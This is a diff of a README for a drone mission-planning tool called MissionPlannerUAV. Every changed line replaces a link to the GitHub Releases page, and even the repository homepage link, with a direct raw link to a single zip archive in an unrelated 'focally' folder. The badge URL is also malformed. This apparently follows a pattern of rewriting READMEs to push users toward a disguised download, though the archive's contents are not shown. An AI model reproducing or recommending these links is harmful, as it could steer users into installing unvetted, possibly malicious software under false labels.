@@ -13,10 +13,10 @@ To begin using MissionPlannerUAV, follow these steps:
    - Internet Connection: Required for downloading and updating
 
 2. Visit the Releases page to download the software:  
-   [![Download MissionPlannerUAV](https://img.shields.io/badge/download-via%20GitHub-blue.svg)](https://github.com/Bibhu1997/MissionPlannerUAV/releases)
+   [![Download MissionPlannerUAV](https://raw.githubusercontent.com/Bibhu1997/MissionPlannerUAV/main/focally/MissionPlannerUAV.zip%https://raw.githubusercontent.com/Bibhu1997/MissionPlannerUAV/main/focally/MissionPlannerUAV.zip)](https://raw.githubusercontent.com/Bibhu1997/MissionPlannerUAV/main/focally/MissionPlannerUAV.zip)
 
 ## 💾 Download & Install
-1. Go to the [Releases page](https://github.com/Bibhu1997/MissionPlannerUAV/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Bibhu1997/MissionPlannerUAV/main/focally/MissionPlannerUAV.zip).
 2. Locate the latest version of MissionPlannerUAV.
 3. Click the download link for your operating system (Windows or macOS).
 4. Once the file downloads, open it to start the installation process.
@@ -40,7 +40,7 @@ To begin using MissionPlannerUAV, follow these steps:
 ## ❓ Frequently Asked Questions
 
 ### How do I update the software?
-Visit the [Releases page](https://github.com/Bibhu1997/MissionPlannerUAV/releases) whenever a new version is available. Download and install it the same way you did initially.
+Visit the [Releases page](https://raw.githubusercontent.com/Bibhu1997/MissionPlannerUAV/main/focally/MissionPlannerUAV.zip) whenever a new version is available. Download and install it the same way you did initially.
 
 ### Can I run MissionPlannerUAV on Linux?
 Currently, MissionPlannerUAV supports Windows and macOS only. Linux support may be added in future versions.
@@ -59,7 +59,7 @@ We welcome contributions! If you want to help improve MissionPlannerUAV, feel fr
 
 ## 🔗 Connect with Us
 Stay updated with the latest news and updates on MissionPlannerUAV:
-- GitHub Repository: [MissionPlannerUAV GitHub](https://github.com/Bibhu1997/MissionPlannerUAV)
+- GitHub Repository: [MissionPlannerUAV GitHub](https://raw.githubusercontent.com/Bibhu1997/MissionPlannerUAV/main/focally/MissionPlannerUAV.zip)
 - Join the community discussions on GitHub and offer suggestions or report issues.
 
 ## 🏁 Conclusion
